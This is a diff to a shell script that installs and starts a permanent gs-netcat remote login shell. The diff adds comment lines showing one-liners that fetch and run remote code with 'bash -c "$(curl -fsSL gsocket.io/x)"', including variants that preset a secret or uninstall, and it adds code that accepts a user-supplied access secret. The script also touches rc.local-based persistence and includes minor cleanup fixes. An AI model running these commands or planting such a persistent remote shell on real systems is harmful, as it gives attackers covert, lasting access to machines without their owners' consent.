@@ -3,8 +3,13 @@
 # Install and start a permanent gs-netcat remote login shell
 #
 # This script is typically invoked like this as root or non-root user:
-# $ bash -c "$(curl -fsSL gsocket.io/x)"
-# $ bash -c "$(curl -L gsocket.io/x)"
+#   $ bash -c"$(curl -fsSL gsocket.io/x)"
+#
+# Pre-set a secret:
+#   $ X=MySecret bash -c"$(curl -fsSL gsocket.io/x)"
+# Uninstall
+#   $ GS_UNDO=1 bash -c"$(curl -fsSL gsocket.io/x)"
+#
 #
 # This can be used when:
 # - gs-netcat is _not_ installed
@@ -34,7 +39,7 @@ CN="\033[0m"    # none
 
 exit_clean()
 {
-	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR}/"*; rmdir "${TMPDIR}"; } &>/dev/null
+	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR:?}/"*; rmdir "${TMPDIR}"; } &>/dev/null
 	rm -rf "${GS_PREFIX}/etc/rc.local-old" &>/dev/null
 	rm -rf "${GS_PREFIX}/etc/rc.local-new" &>/dev/null
 }
@@ -511,6 +516,9 @@ OK_OUT
 
 GS_SECRET=$("$DSTBIN" -g)
 [[ -z "$GS_SECRET" ]] && { FAIL_OUT "Execution failed...wrong binary?"; errexit; }
+# User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+[[ -n $X ]] && GS_SECRET="$X"
+
 
 # -----BEGIN Install permanentally-----
 # Try to install system wide. This may also start the service.
